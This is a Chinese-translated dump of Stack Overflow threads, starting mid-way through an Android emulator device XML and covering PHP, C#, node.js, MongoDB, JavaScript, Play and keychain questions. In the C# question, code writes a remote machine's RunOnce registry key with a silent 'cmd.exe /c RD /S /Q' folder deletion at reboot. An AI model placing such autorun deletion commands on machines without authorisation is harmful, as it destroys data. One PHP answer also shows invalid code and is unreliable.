            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>ldpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:text-input-method>qwerty</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>240</d:size>
                <d:size>320</d:size>
            </d:screen-dimension>
            <d:xdpi>145</d:xdpi>
            <d:ydpi>145</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, closed">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, open">
            <d:keyboard-state>keysexposed</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="3.2in HVGA slider (ADP1)">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>notlong</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:text-input-method>qwerty</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>trackball</d:nav-method>
            <d:screen-dimension>
                <d:size>320</d:size>
                <d:size>480</d:size>
            </d:screen-dimension>
            <d:xdpi>180.6</d:xdpi>
            <d:ydpi>182</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, closed">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, open">
            <d:keyboard-state>keysexposed</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="3.2in HVGA (ADP2)">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>notlong</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>trackball</d:nav-method>
            <d:screen-dimension>
                <d:size>320</d:size>
                <d:size>480</d:size>
            </d:screen-dimension>
            <d:xdpi>180.6</d:xdpi>
            <d:ydpi>182</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="3.3in WQVGA">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>ldpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>240</d:size>
                <d:size>400</d:size>
            </d:screen-dimension>
            <d:xdpi>141</d:xdpi>
            <d:ydpi>141</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>
    <d:device name="3.4in FWQVGA">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>ldpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>240</d:size>
                <d:size>432</d:size>
            </d:screen-dimension>
            <d:xdpi>145</d:xdpi>
            <d:ydpi>145</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="3.7in WVGA (Nexus One)">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>hdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>trackball</d:nav-method>
            <d:screen-dimension>
                <d:size>480</d:size>
                <d:size>800</d:size>
            </d:screen-dimension>
            <d:xdpi>254</d:xdpi>
            <d:ydpi>254</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="3.7in FWVGA slider">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>hdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:text-input-method>qwerty</d:text-input-method>
            <d:nav-state>navhidden</d:nav-state>
            <d:nav-method>dpad</d:nav-method>
            <d:screen-dimension>
                <d:size>480</d:size>
                <d:size>854</d:size>
            </d:screen-dimension>
            <d:xdpi>265</d:xdpi>
            <d:ydpi>265</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, closed">
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
        <d:config name="Landscape, open">
            <d:keyboard-state>keysexposed</d:keyboard-state>
            <d:screen-orientation>land</d:screen-orientation>
            <d:nav-state>navexposed</d:nav-state>
        </d:config>
    </d:device>

    <d:device name="4in WVGA (Nexus S)">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>hdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>480</d:size>
                <d:size>800</d:size>
            </d:screen-dimension>
            <d:xdpi>235</d:xdpi>
            <d:ydpi>235</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="4.65in 720p (Galaxy Nexus)">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>xhdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>720</d:size>
                <d:size>1280</d:size>
            </d:screen-dimension>
            <d:xdpi>316</d:xdpi>
            <d:ydpi>316</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="4.7in WXGA">
        <d:default>
            <d:screen-size>normal</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>xhdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>1280</d:size>
                <d:size>720</d:size>
            </d:screen-dimension>
            <d:xdpi>320</d:xdpi>
            <d:ydpi>320</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="5.1in WVGA">
        <d:default>
            <d:screen-size>large</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>480</d:size>
                <d:size>800</d:size>
            </d:screen-dimension>
            <d:xdpi>183</d:xdpi>
            <d:ydpi>183</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="5.4in FWVGA">
        <d:default>
            <d:screen-size>large</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>port</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>480</d:size>
                <d:size>854</d:size>
            </d:screen-dimension>
            <d:xdpi>181</d:xdpi>
            <d:ydpi>181</d:ydpi>
        </d:default>

        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="7in WSVGA (Tablet)">
        <d:default>
            <d:screen-size>large</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>land</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>1024</d:size>
                <d:size>600</d:size>
            </d:screen-dimension>
            <d:xdpi>169</d:xdpi>
            <d:ydpi>169</d:ydpi>
        </d:default>

        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
    </d:device>

    <d:device name="10.1in WXGA (Tablet)">
        <d:default>
            <d:screen-size>xlarge</d:screen-size>
            <d:screen-ratio>long</d:screen-ratio>
            <d:screen-orientation>land</d:screen-orientation>
            <d:pixel-density>mdpi</d:pixel-density>
            <d:touch-type>finger</d:touch-type>
            <d:keyboard-state>keyssoft</d:keyboard-state>
            <d:text-input-method>nokeys</d:text-input-method>
            <d:nav-state>navexposed</d:nav-state>
            <d:nav-method>nonav</d:nav-method>
            <d:screen-dimension>
                <d:size>1280</d:size>
                <d:size>800</d:size>
            </d:screen-dimension>
            <d:xdpi>149</d:xdpi>
            <d:ydpi>149</d:ydpi>
        </d:default>

        <d:config name="Landscape">
            <d:screen-orientation>land</d:screen-orientation>
        </d:config>
        <d:config name="Portrait">
            <d:screen-orientation>port</d:screen-orientation>
        </d:config>
    </d:device>
</d:layout-devices> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T14:06:17.313

处理上面的 xml 并将其粘贴到 device.xml 文件中对我有用，谢谢 Nixiti，这看起来很容易，但它有很大帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-21T05:52:06.597

现在它更改为USER_HOME/.android中的**devices.xml (NOT device.xml) 文件**

更高版本的 Android SDK 工具有 SDK_FOLDER/tools/lib/ **devices.xml**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-27T07:31:46.683

不严重。只需将预览窗格上的渲染版本切换到较低版本即可。

![在此处输入图像描述](../Images/2c1f87ebf9316530aa227d5788fe013b.png)**

# eclipse - 无法使用“运行码头运行”加载 dll 库

> ID：13418300
> 
> 赞同：1
> 
> 时间：2012-11-16T14:12:30.197
> 
> 标签：eclipse, dll, jetty, native

在我的项目中，我尝试使用

System.loadLibrary()。

这适用于 wtp jetty 扩展和 maven jetty 插件。但是使用 run jetty run eclipse 插件，服务器挂断而没有错误消息。这是一个限制还是可以配置？

# php - 其他类中的类的PHP调用方法

> ID：13418302
> 
> 赞同：0
> 
> 时间：2012-11-16T14:12:31.430
> 
> 标签：php, class, methods, call

代码示例：

```
<?php // class_database.php
class database
{
include("class_validation.php"); //this does not work
$val = new validation() //this does not work
    public function login($value)
    {
if($val->validate($value))
{
//do something
}
    }
}

<?php // class_validation.php
class validation
{
    public function validate($value)
    {
if($value > 50) return true;
return false;
    }
} 
```

如何委派类数据库中的类验证？我不希望继承（实现或扩展）类验证-> 验证中的行为不会改变。我只想使用验证类中的方法。任何面向对象的解决方案？提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:17:52.617

你不能在这样的类中使用包含！`$val = new validation();`要么将它包含在文件的开头（我的建议），要么在调用前使用它一行。

类数据库.php：

```
<?php
    include("class_validation.php");

    class database
    {
        public function login($value)
        {
            $val = new validation();
            if($val->validate($value))
            {
                //do something
            }
        }
    }
?> 
```

  类验证.php：

```
<?php
    class validation
    {
        public function validate($value)
        {
            if($value > 50)
                return true;

            return false;
        }
    }
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:16:03.953

你需要移动到`include`课堂之外。PHP 不允许类中的类。

尝试这样的事情：

代码示例：

```
<?php 
include("class_validation.php"); // include outside the class declaration
// class_database.php
class database
{

$val = new validation()
    public function login($value)
    {
if($val->validate($value))
{
//do something
}
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:16:29.833

您可以将`include()`类放在外部（在页面顶部，class_database.php），或者如果您使用框架/自动加载器，您可以通过命名空间调用它：

**选项1**

```
<?php
include('class_validation.php');
class database {

} 
```

**选项 2**

```
namespace ThisCoolThing;
use \OtherCoolThing\validation;

class database { ... } 
```

# c# - 无法写入注册表

> ID：13418304
> 
> 赞同：0
> 
> 时间：2012-11-16T14:12:35.827
> 
> 标签：c#, registry

以下代码不会写入我在那里的注册表，但会与我尝试过的许多其他代码一起写入。它运行代码并且不返回任何内容。在我检查 reg 之前它似乎一直有效，但那里什么也没有。

我有适当的权限，但我不明白为什么这个密钥如此特别。我可以手动进入并创建它，但我需要这个程序来完成它。提前致谢。

```
string machineName = txtBox.Text;
RegistryKey subKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, machineName).OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true);
subKey.SetValue("DeltmpfileOnReboot", @"cmd.exe /c RD /S /Q C:\data\tempFolder /f", RegistryValueKind.String); 
```

找到了钥匙……它神奇地出现在 HKLM\SOFTWARE\Wow6432Node。奇怪的...

*编辑*发现问题...[在Wow6432Node中写入注册表值而不重定向](https://stackoverflow.com/questions/7311146/write-the-registry-value-without-redirect-in-wow6432node)hans passant的第二个答案...它总是像那样愚蠢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:16:07.380

你的方法是错误的。如果您想在重新启动时删除文件，最好使用 Win32 API `MoveFileEx`。

看这里：

[http://msdn.microsoft.com/en-us/library/windows/desktop/aa365240(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365240(v=vs.85).aspx)

和：

[http://www.pinvoke.net/default.aspx/kernel32.MoveFileEx](http://www.pinvoke.net/default.aspx/kernel32.MoveFileEx)

您只需将目标设置为 null 并`MOVEFILE_DELAY_UNTIL_REBOOT`在标志中指定。

# unit-testing - node.js 中的 require 如何处理全局变量？

> ID：13418306
> 
> 赞同：0
> 
> 时间：2012-11-16T14:12:36.427
> 
> 标签：unit-testing, node.js, require

我刚刚发现，如果我需要一个模块并将其存储为全局，我可以覆盖模块中的方法和属性，如下所示：

```
global.passwordhelper_mock = require("helpers/password")
sinon.stub(passwordhelper_mock, "checkPassword").returns true 
```

如果我需要另一个本身使用上述存根方法的模块，则将使用我的存根版本。

node.js中的函数如何`require`注意到这些全局变量？为什么它仅在我覆盖/存根已保存为全局的模块时才有效？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:41:10.197

> node.js 中的 require 函数如何注意到这些全局变量？

在模块内部的某个地方，必须调用 module.exports.someObject = function(x) {...} 才能使 someObject 全局可用。

> 为什么它仅在我覆盖/存根已保存为全局的模块时才有效？

不确定我是否关注这里。如果对象被隐藏，那么您将无法覆盖它。您可以覆盖任何可用的对象，可以是全局对象（例如控制台），也可以是运行时可用的任何对象的属性（例如，console.log）。

# php - Mongodate 转换

> ID：13418309
> 
> 赞同：2
> 
> 时间：2012-11-16T14:12:48.440
> 
> 标签：php, mongodb, lithium

执行查询后

```
$orders = Orders::connection()->connection->command(array(
  'aggregate' => 'orders',
  'pipeline' => array( 
    array( 
      '$group' => array( 
        '_id' => array('cust_id'=>'$cust_id','ord_date'=>'$ord_date'),
      'total' => array( '$sum' => '$price') ,
        ),
      ),
    )
)); 
```

我得到 $orders 的输出数组为

```
Array
(
    [0] => Array
        (
            [_id] => Array
                (
                    [cust_id] => xyz123
                    [ord_date] => MongoDate Object
                        (
                            [sec] => 1351875851
                            [usec] => 102000
                        )

                )

            [total] => 75
        )

    [1] => Array
        (
            [_id] => Array
                (
                    [cust_id] => abc123
                    [ord_date] => MongoDate Object
                        (
                            [sec] => 1351875851
                            [usec] => 102000
                        )

                )

            [total] => 125
        )

) 
```

我已尝试使用 MongoDate 对象进行以下操作以正确打印它

```
foreach($orders['result'] as $o){
    $date = $o['ord_date'];
    echo date('Y-M-d',$date->sec);
} 
```

也试过

```
foreach($orders['result'] as $o){
    $date = new MongoDate ($o['ord_date']);
    echo date('Y-M-d',$date->sec);
} 
```

有人可以告诉我这样做的正确方法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T16:01:57.350

您缺少`_id`对象的级别。试试这个：

```
foreach($orders['result'] as $o){
    $date = $o['_id']['ord_date'];
    echo date('Y-M-d',$date->sec);
} 
```

# windows-server-2008 - NT Eventlog 单条消息大小

> ID：13418312
> 
> 赞同：12
> 
> 时间：2012-11-16T14:12:58.313
> 
> 标签：windows-server-2008, windows-server-2003, event-log

谁能告诉我 Windows NT 日志消息的最大大小是多少？我知道可以将事件日志的最大日志大小从 32 MB 重置。我对单个消息可以在 NT 事件日志中保存的内存感兴趣。

提前致谢

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-10-04T23:00:42.280

在 Windows Server 2008 中，单个事件日志条目的最大大小为：31,839 个字符 [http://msdn.microsoft.com/EN-US/library/windows/desktop/aa363679.aspx](http://msdn.microsoft.com/EN-US/library/windows/desktop/aa363679.aspx)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-16T17:27:04.643

答案是 32766 个字符 ~ 32 KB

请参阅下面的示例：错误：日志条目字符串太长。写入事件日志的字符串不能超过 32766 个字符。

# algorithm - 如何减少这种 BinPack 算法？（它可能被称为 MinBreak-BinFill 之类的东西。）

> ID：13418314
> 
> 赞同：1
> 
> 时间：2012-11-16T14:13:13.057
> 
> 标签：algorithm, optimization, np-hard

我使用 BinPack 问题的特殊变体。我使用一种简单的算法 atm，所以我想知道**如何调用它**来进行一些初步研究。或者有谁知道**如何将这个问题减少**到已知的问题？

* * *

问题：有特定数量和大小的项目 I 和箱 B。

```
|I| ∈ ℕ, |B| ∈ ℕ
s : (I ∪ B) → ℕ 
```

所有 item-size 的总和至少是所有 bin 的总和的大小。

```
∑ _{i∈I} s(i) ≥ ∑ _{b∈B} s(b) 
```

每个箱子都必须装满物品或物品的一部分，以便完全装满。`s(b,i)`是在 b 中的 i 部分的大小，如果不是，则为 0。

```
∀ b ∈ B, i ∈ I: s(b,i) ∈ ℕ ∪ {0}
∀ i ∈ I: ∑ _{b∈B} s(b,i) ≤ s(i)
∀ b ∈ B: ∑ _{i∈I} s(b,i) ≥ s(b) 
```

目标是最小化填充所有箱子所需的项目零件数量。

```
numparts = |{ (b,i) ∈ B×I | s(b,i)>0 }|
find min(numparts) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-06T12:31:11.320

最后！

它被称为***具有大小保持碎片的装箱（BP-SPF）***。

有这篇论文

[**使用项目碎片包装的近似方案** *Omer Yehezkely*](http://www.cs.technion.ac.il/~hadas/THESES/Omer.pdf) （2006 年 11 月）

# cloud-foundry - Cloud Foundry 上的 WaveMaker 应用程序，带有下拉列表框

> ID：13418317
> 
> 赞同：1
> 
> 时间：2012-11-16T14:13:15.147
> 
> 标签：cloud-foundry

应用程序在本地机器和服务器上运行良好。很好地向云端推出，但由 WM 中的服务变量填充的下拉列表框在云端不起作用。任何有关解决方案的建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T16:33:24.757

您是否查看过 Cloud Foundry 上的应用程序日志，看看它是否揭示了连接到数据源的任何问题？确保有一个 MySQL 实例绑定到应用程序。如果你给我申请网址，我可以代表你看一下..

# javascript - 在 CRM 2011 Outlook-Client 中处理 JS 窗口 onBeforeUnload 事件

> ID：13418319
> 
> 赞同：2
> 
> 时间：2012-11-16T14:13:15.673
> 
> 标签：javascript, dynamics-crm-2011, dom-events, onbeforeunload

我在处理`window.onbeforeunload`Microsoft Dynamics CRM 2011 的 HTML-web 资源中的 JS 应用程序中的事件时遇到了问题。通过使用“普通”IE，以下代码可以正常工作：

```
window.onbeforeunload = function (e) {
    if (changedData) {
        var message = 'leave...';
        if (typeof e == 'undefined') {
            e = document.parentWindow.event;
        }
        if (e) {
            e.returnValue = message;
        }
        return message;
    }
} 
```

但在 CRM 2011 Outlook 客户端中，我没有收到留言。你有什么想法在关闭窗口时收到留言吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:53:08.683

Outlook 与 IE 中的 CRM“对象堆栈”可能不同（因为如果没有别的，Outlook 容器窗口涉及包装 IE Iframe），因此当您使用“未记录”事件（在 CRM SDK 意义上）时，您将容易受到这种“惊喜”的影响；）

你希望你的代码会发生什么？您只是`returnValue`在事件上设置 - 仅此一项不会导致任何用户反馈。

您是否确认您的代码是否正在运行（即插入一个`alert();`）？

# javascript - 使用overflow-x:hidden 在元素中单击鼠标滚轮来禁用水平滚动

> ID：13418320
> 
> 赞同：8
> 
> 时间：2012-11-16T14:13:16.107
> 
> 标签：javascript, jquery, html, css

如何通过单击鼠标滚轮来确定水平滚动的可能性并在元素中使用 overflow-x:hidden 禁用它（使用 JavaScript 或 jQuery）？在 Firefox 中滚动是不可能的，但在 IE、Chrome 和 Safari 中可以。代码示例：

`<div style="overflow-x:hidden; overflow-y:auto;">...</div>`

截图：

![火狐](../Images/fa387b4b1de2266d43958f6d8e3ed5a8.png) ![铬合金](../Images/36c2a20d855524756fed04fd2f151309.png) ![苹果浏览器](../Images/c9c43c892d9bbe4c7f969473fbb2cc35.png) ![IE](../Images/d6efc351a7a8254b479ee5071ab6613e.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:38:32.683

完全可能，但不是最佳实践（不过，我认为您有充分的理由想要这样做）：

```
$('#yourDivId').on('scroll', function(){
    $('#container').scrollLeft(0);
});​ 
```

有关工作片段，请参阅[http://jsfiddle.net/q5CTS/3/ 。](http://jsfiddle.net/q5CTS/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:44:30.500

你可以用 jQuery 禁用它：

```
$(document).ready(function(){
   $('.parent').bind('mousewheel', function(event, delta) {
   return false;
}); 

}); 
```

类parant是父div。

# java - 使变量在所有 Play 2.0 项目视图中都可访问

> ID：13418322
> 
> 赞同：0
> 
> 时间：2012-11-16T14:13:17.550
> 
> 标签：java, playframework-2.0

有时希望与所有视图共享上下文变量，例如当前用户或导航状态。查看文档，我无法找到一种方法来共享模板引擎在所有视图中都可以访问的全局上下文变量。

这是由框架提供的，还是我最好将这些变量显式传递给所有视图，也许通过编写一个在其视图需要这些全局变量的所有控制器中调用的包装器方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:34:12.020

您可以使用[Session 和 Flash 范围](http://www.playframework.org/documentation/2.0.4/JavaSessionFlash)

```
public static Result index() {
    // session is good for storing session data such as for an example logged user's info
    session("username", "John Doe");

    // flash is available only for next request (in this case for view rendering process)
    flash("navId", "mainPage");

    return ok(index.render("ellou' World"));
} 
```

`index.scala.html`

```
@(message: String)

@main(message) {
    @if(flash.get("navId")=="mainPage"){<h1>Great! You're on main page again</h1>}
    <div>You're logged as @session.get("username")</div>
} 
```

当然，对于每个页面的数据（如 sample `navId`），您也可以将其传递给视图，您可以在视图中声明除`String`.

# macos - SecKeychainFindGenericPassword 不适用于 osx

> ID：13418325
> 
> 赞同：0
> 
> 时间：2012-11-16T14:14:01.630
> 
> 标签：macos, passwords, keychain

按照我用来获取存储在自定义钥匙串中的密码的一段代码

```
-(OSStatus *)getPasswordFromKeyChain:(NSString *)username{
OSStatus status;

[self createKeyChainIfNotExists];

const char *cService_name = "Mac Google Analytics App";
UInt32 service_length = strlen(cService_name);

const char *cUser_name = [username cStringUsingEncoding:NSUTF8StringEncoding];
UInt32 username_length = strlen(cUser_name);

void *passwordData = nil; 
SecKeychainItemRef itemRef = nil;
UInt32 passwordLength = nil;

status = SecKeychainFindGenericPassword(
                                        mSecKeychainRef,            // default keychain
                                        service_length,  // length of service name
                                        cService_name,    // service name
                                        username_length,// length of account name
                                        cUser_name,    // account name
                                        &passwordLength,  // length of password
                                        passwordData,        // pointer to password data
                                        NULL             // the item reference
                                        );

return status;
} 
```

我想知道这段代码有什么问题，因为它永远不会来自这个调用：

```
SecKeychainFindGenericPassword 
```

它指向[此处显示](https://i.imgur.com/5U7jq.png?1)的错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T17:10:00.433

为默认钥匙串传递 null，您需要一个指向 passwordData 的指针。这至少应该让您返回状态，以判断字符串对于您的服务和帐户是否正确。

```
 status = SecKeychainFindGenericPassword(NULL,            // default keychain
                                            service_length,  // length of service name
                                            cService_name,    // service name
                                            username_length,// length of account name
                                            cUser_name,    // account name
                                            &passwordLength,  // length of password
                                            &passwordData,        // pointer to password data
                                            NULL             // the item reference
                                            ); 
```

# android - Android：自定义 TableLayout 未检测到 OnGestureListener.onFling(...)

> ID：13418329
> 
> 赞同：2
> 
> 时间：2012-11-16T14:14:14.763
> 
> 标签：android, gesture, custom-view

我有一个自定义`TableLayout`的代码：

```
public class PageTableLayout extends TableLayout{

private static Context context;
private GestureDetector gDetector;

public PageTableLayout(Context context) {
    super(context);
    this.context = context;
    gDetector = new GestureDetector(context, gesture_listner);
}

public PageTableLayout( Context context, AttributeSet attrs ){
    super( context, attrs );
    this.context = context;
    gDetector = new GestureDetector(context , gesture_listner);
}

@Override
public boolean dispatchTouchEvent(MotionEvent me) {
    Log(debug, "dispatchTouchEvent()");
    super.dispatchTouchEvent(me); 
    return gDetector.onTouchEvent(me);
}

private OnGestureListener gesture_listner = new OnGestureListener(){
    public boolean onDown(MotionEvent e) {
        // TODO Auto-generated method stub
        Log(debug, "onDown()..." );
        return false;
    }

    public boolean onFling(MotionEvent start, MotionEvent finish, float velocityX, float velocityY) {
        Log.(debug, "onFling()..." );
        .....
    }

    ...

 } 
```

使用此代码，我无法检测到该`onFling`事件（它没有被调用！！！）..有什么建议吗？如果我把它`OnGestureListener`放在一个`Activity`它的工作原理！`TableLayout`包含包含的简单`TableRow`元素`TextView`。请帮我..

# php - 从两个数组打印信息

> ID：13418335
> 
> 赞同：0
> 
> 时间：2012-11-16T14:14:28.777
> 
> 标签：php, arrays, foreach

现在尝试从数组中打印信息，并且不想在 foreach 循环中使用 manu foreach 。如何从这个数组中输出数据非常有趣

```
Array
(
[aM] => Array
    (
        [0] => Array
            (
                [iId] => 0
                [iTime] => 00
            )

        [1] => Array
            (
                [iId] => 1
                [iTime] => 11
            )

        [2] => Array
            (
                [iId] => 2
                [iTime] => 22
            )
    )

[aN] => Array
    (
        [0] => Array
            (
                [sName] => a
            )

        [1] => Array
            (
                [sName] => b
            )

        [2] => Array
            (
                [sName] => v
            )
    )
) 
```

像这样，来自第一个数组的数据靠近来自第二个数组的数据

```
0 a, 1 b, 2v 
```

? 不像这里，首先我们从第一个输出所有数据，而不是从第二个

```
0 1 2 a b v 
```

?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:18:29.267

您可以使用 a 轻松完成此操作[`MultipleIterator`](http://php.net/multipleiterator)，这将轻松遍历两个数组：

```
// $array = your array from up there

$iter = new MultipleIterator;
$iter->attachIterator( new ArrayIterator( $array['aM']));
